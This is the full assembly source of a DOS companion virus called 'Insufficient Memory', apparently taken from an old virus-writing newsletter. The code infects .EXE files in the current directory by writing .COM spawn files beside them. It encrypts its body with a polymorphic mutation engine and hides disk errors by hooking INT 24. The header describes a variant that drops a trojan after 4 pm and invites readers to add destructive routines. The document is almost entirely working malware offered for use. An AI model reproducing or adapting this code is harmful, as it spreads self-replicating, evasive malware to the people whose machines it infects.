;INSUFFICIENT MEMORY virus - by URNST KOUCH for Crypt Newsletter #6
;INSUFF MEMO is a simple MUTATION ENGINE loaded spawning virus, which 
;confines itself to the current directory. To assemble with TASM 2.5, user
;must have complete MTE091B software package (including RND.OBJ,
;MTE.OBJ and stubfile, NOPS.BIN). Use MAKE2.BAT included in this
;issue of the Crypt Newsletter to assemble all proper
;components. Observant readers will notice INSUFF MEMO takes advantage of
;VCL 1.0 code as well as notation from the SARA virus.  INSUFF MEMO is
;a non-threatening, unique example of an MtE-loaded companion virus -
;the only one in circulation, in fact.
;
;INSUFF2, included as a DEBUG script in this newsletter, is functionally        
;identical to this virus.  However, for those who 'require' a destructive
;program for their full enjoyment, it is loaded with a routine which
;simple checks the system time and branches to some 'dropper' code if
;after quitting time (4:00 pm).  The 'dropper' reads from a data table
;and writes the NOIZ trojan to any .EXE in the current directory. By
;looking carefully at this code, several areas where 'potentially'
;destructive/nuisance routines can be added will suggest themselves.
;We do not include them for a number of reasons: 1) they are easy to
;come by in any number of books on assembly coding, the VCL 1.0 (an
;excellent source), or source code archives on mnay BBS's, and; 2)
;it allows you to get creative if you want and tinker (like I do all the
; time) with the basic layout of virus source.
;        
;INSUFF3's source listing is modified to allow the virus to jump out        
;of the current directory when all files in it are infected.  The
;listing is publicly available at the BBS's listed at the end of the
;Crypt newsletter.

	.model  tiny
	.radix  16
	.code

	extrn   mut_engine: near
	extrn   rnd_buf: word, data_top: near

	org     100

start:
	call    locadr

reladr: 
	db      'Insufficient memory'
	
locadr:
	pop     dx
	mov     cl,4
	shr     dx,cl
	sub     dx,10
	mov     cx,ds
	add     cx,dx                   ;Calculate new CS
	mov     dx,offset begin
	push    cx dx
	retf
begin:
	cld
	mov     di,offset start
	push    es di                   ;
	push    cs                      ;A carry over from the DAV
	pop     ds                      ;SARA virus, something of a curiosity
					;in this companion virus
	mov     dx,offset dta_buf       ;Set DTA
	mov     ah,1a
	int     21
	mov     ax,3524                 ;Hook INT 24, error handler
	int     21                      ;see bottom of code
	push    es bx
	mov     dx,offset fail_err
	mov     ax,2524
	int     21

        xor     ax,ax                   ;Initialize random seed for MtE
	mov     [rnd_buf],ax            ;could be coded, mov  cs:[rnd_buf],0
	push    sp                      ;process necessary for generation of
	pop     cx                      ;MtE encryption key - see MtE docs
	sub     cx,sp                   ;for further notation
	add     cx,4
	push    cx
	mov     dx,offset srchnam   ;EXE file-mask for spawn-name search
	mov     cl,3
	mov     ah,4e               ; DOS find first file function
       
find_a_file:    
       int     021h
       jc      infection_done          ; Exit if no files found
       jmp     infect                  ; Infect the file!
       jnc     infection_done          ; Exit if no error
findr: mov     ah,04Fh                 ; DOS find next file function
       jmp     find_a_file             ; Try finding another file

	
infection_done: 
     
	mov     ax,4C00h                ;terminate
	int     21h

infect:
	mov     ah,02Fh                 ; DOS get DTA address function
	int     021h
	mov     di,bx                   ; DI points to the DTA

	lea     si,[di + 01Eh]          ; SI points to file name
	mov     dx,si                   ; DX points to file name, too
	mov     di,offset spawn_name + 1; DI points to new name
	xor     ah,ah                   ; AH holds character count
transfer_loop:  
	lodsb                           ; Load a character
	or      al,al                   ; Is it a NULL?
	je      transfer_end            ; If so then leave the loop
	inc     ah                      ; Add one to the character count
	stosb                           ; Save the byte in the buffer
	jmp     short transfer_loop     ; Repeat the loop
transfer_end:   
	mov     byte ptr [spawn_name],ah; First byte holds char. count
	mov     byte ptr [di],13        ; Make CR the final character
	mov     di,dx                   ; DI points to file name
	xor     ch,ch                   ;
	mov     cl,ah                   ; CX holds length of filename
	mov     al,'.'                  ; AL holds char. to search for
repne   scasb                           ; Search for a dot in the name
	mov     word ptr [di],'OC'      ; Store "CO" as first two bytes
	mov     byte ptr [di + 2],'M'   ; Store "M" to make "COM"

	mov     byte ptr [set_carry],0  ; Assume we'll fail
	mov     ax,03D00h               ; DOS open file function, r/o
	int     021h
	jnc     findr                   ; File already exists, so leave
	mov     byte ptr [set_carry],1  ; Success -- the file is OK
	mov     ah,03Ch                 ; DOS create file function
	mov     cx,00100111b            ; CX holds file attributes (all)
	int     21h
	xchg    bx,ax                   ; BX holds file handle
	push    dx cx
	mov     ax,offset data_top+0Fh
	mov     cl,4
	shr     ax,cl
	mov     cx,cs
	add     ax,cx
	mov     es,ax
	mov     dx,offset start   ; DX points to start of virus
	mov     cx,offset _DATA   ; CX holds virus length for encryption 
	push    bp bx
	mov     bp,0100h  ;tells MtE decryption routine will
	xor     si,si     ;hand over control to where virus adds 
	xor     di,di     ;itself to 'infected' file, in this case offset  
	mov     bl,0Fh    ;0100h .. set si/di to 0, bl to 0Fh, all required 
	mov     ax,101    ;set bit-field in ax 
	call    mut_engine   ;call the Mutation Engine to do its thing
	pop     bx ax
	add     ax,cx
	neg     ax
	xor     ah,ah
	add     ax,cx
	mov     ah,040h          ;write encrypted virus to newly created file 
	int     21h
	mov     ah,03Eh          ;close the file 
	int     21h
	cmp     byte ptr [set_carry],1    
	jmp     infection_done            ;move to end game

		

fail_err:                      ;Critical error handler
	mov     al,3           ;prevents virus from producing
	iret                   ;messages on write-protected disks.
			       ;Not handed back to machine when virus exits.
srchnam db      '*.EXE',0      ;File-mask for 'spawn-search.'



	.data

dta_buf         db      2bh dup(?)              ; Buffer for DTA
spawn_name      db      12,12 dup (?),13        ; Name for next spawn
set_carry       db      ?                       ; Set-carry-on-exit flag
	
	end     start
